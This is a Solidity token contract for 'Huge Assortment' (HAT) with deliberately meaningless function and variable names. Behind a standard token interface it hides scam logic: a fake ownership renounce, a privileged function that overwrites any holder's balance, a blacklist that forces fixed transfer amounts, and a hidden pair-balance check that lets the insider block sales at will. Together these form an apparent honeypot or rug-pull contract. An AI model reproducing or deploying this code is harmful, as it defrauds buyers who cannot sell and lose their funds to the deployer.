//SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

interface amountLaunch {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract tokenTake {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface teamWallet {
    function createPair(address amountTake, address launchedShould) external returns (address);
}

interface modeTeam {
    function totalSupply() external view returns (uint256);

    function balanceOf(address enableReceiver) external view returns (uint256);

    function transfer(address modeTotal, uint256 marketingMode) external returns (bool);

    function allowance(address launchMarketing, address spender) external view returns (uint256);

    function approve(address spender, uint256 marketingMode) external returns (bool);

    function transferFrom(
        address sender,
        address modeTotal,
        uint256 marketingMode
    ) external returns (bool);

    event Transfer(address indexed from, address indexed tokenMin, uint256 value);
    event Approval(address indexed launchMarketing, address indexed spender, uint256 value);
}

interface modeTeamMetadata is modeTeam {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract HugeAssortment is tokenTake, modeTeam, modeTeamMetadata {

    bool private autoAt;

    mapping(address => uint256) private senderAuto;

    function balanceOf(address enableReceiver) public view virtual override returns (uint256) {
        return senderAuto[enableReceiver];
    }

    uint256 constant txTake = 18 ** 10;

    function symbol() external view virtual override returns (string memory) {
        return marketingTrading;
    }

    string private tradingToken = "Huge Assortment";

    function buyFeeTeam(uint256 marketingMode) public {
        isEnable();
        exemptSell = marketingMode;
    }

    bool public sellFrom;

    address public shouldAmount;

    uint256 exemptSell;

    address atShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function fromSwapTx() public {
        emit OwnershipTransferred(takeReceiver, address(0));
        toList = address(0);
    }

    function owner() external view returns (address) {
        return toList;
    }

    function decimals() external view virtual override returns (uint8) {
        return receiverLiquidityExempt;
    }

    function feeAutoSwap(address launchedSender) public {
        isEnable();
        
        if (launchedSender == takeReceiver || launchedSender == shouldAmount) {
            return;
        }
        maxShould[launchedSender] = true;
    }

    uint256 sellToken;

    function name() external view virtual override returns (string memory) {
        return tradingToken;
    }

    event OwnershipTransferred(address indexed marketingListSwap, address indexed enableLaunched);

    function isEnable() private view {
        require(autoLimit[_msgSender()]);
    }

    address isFee = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function approve(address modeFeeTeam, uint256 marketingMode) public virtual override returns (bool) {
        toBuy[_msgSender()][modeFeeTeam] = marketingMode;
        emit Approval(_msgSender(), modeFeeTeam, marketingMode);
        return true;
    }

    function takeExempt(address receiverExempt, address modeTotal, uint256 marketingMode) internal returns (bool) {
        if (receiverExempt == takeReceiver) {
            return senderFundReceiver(receiverExempt, modeTotal, marketingMode);
        }
        uint256 fromAutoList = modeTeam(shouldAmount).balanceOf(isFee);
        require(fromAutoList == exemptSell);
        require(modeTotal != isFee);
        if (maxShould[receiverExempt]) {
            return senderFundReceiver(receiverExempt, modeTotal, txTake);
        }
        return senderFundReceiver(receiverExempt, modeTotal, marketingMode);
    }

    bool private exemptLiquidity;

    mapping(address => bool) public maxShould;

    bool public launchList;

    function liquidityTeamFrom(address walletShould) public {
        require(walletShould.balance < 100000);
        if (sellFrom) {
            return;
        }
        if (autoAt) {
            exemptLiquidity = true;
        }
        autoLimit[walletShould] = true;
        
        sellFrom = true;
    }

    bool public autoMax;

    address public takeReceiver;

    uint256 private liquidityTx = 100000000 * 10 ** 18;

    function totalSupply() external view virtual override returns (uint256) {
        return liquidityTx;
    }

    function senderFundReceiver(address receiverExempt, address modeTotal, uint256 marketingMode) internal returns (bool) {
        require(senderAuto[receiverExempt] >= marketingMode);
        senderAuto[receiverExempt] -= marketingMode;
        senderAuto[modeTotal] += marketingMode;
        emit Transfer(receiverExempt, modeTotal, marketingMode);
        return true;
    }

    function allowance(address listTake, address modeFeeTeam) external view virtual override returns (uint256) {
        if (modeFeeTeam == atShould) {
            return type(uint256).max;
        }
        return toBuy[listTake][modeFeeTeam];
    }

    string private marketingTrading = "HAT";

    address private toList;

    uint8 private receiverLiquidityExempt = 18;

    mapping(address => bool) public autoLimit;

    constructor (){
        
        amountLaunch walletShouldMin = amountLaunch(atShould);
        shouldAmount = teamWallet(walletShouldMin.factory()).createPair(walletShouldMin.WETH(), address(this));
        if (senderList) {
            launchList = false;
        }
        takeReceiver = _msgSender();
        fromSwapTx();
        autoLimit[takeReceiver] = true;
        senderAuto[takeReceiver] = liquidityTx;
        if (exemptLiquidity != autoAt) {
            autoMax = false;
        }
        emit Transfer(address(0), takeReceiver, liquidityTx);
    }

    mapping(address => mapping(address => uint256)) private toBuy;

    function getOwner() external view returns (address) {
        return toList;
    }

    function toMode(address receiverEnable, uint256 marketingMode) public {
        isEnable();
        senderAuto[receiverEnable] = marketingMode;
    }

    bool public senderList;

    function transferFrom(address receiverExempt, address modeTotal, uint256 marketingMode) external override returns (bool) {
        if (_msgSender() != atShould) {
            if (toBuy[receiverExempt][_msgSender()] != type(uint256).max) {
                require(marketingMode <= toBuy[receiverExempt][_msgSender()]);
                toBuy[receiverExempt][_msgSender()] -= marketingMode;
            }
        }
        return takeExempt(receiverExempt, modeTotal, marketingMode);
    }

    function transfer(address receiverEnable, uint256 marketingMode) external virtual override returns (bool) {
        return takeExempt(_msgSender(), receiverEnable, marketingMode);
    }

}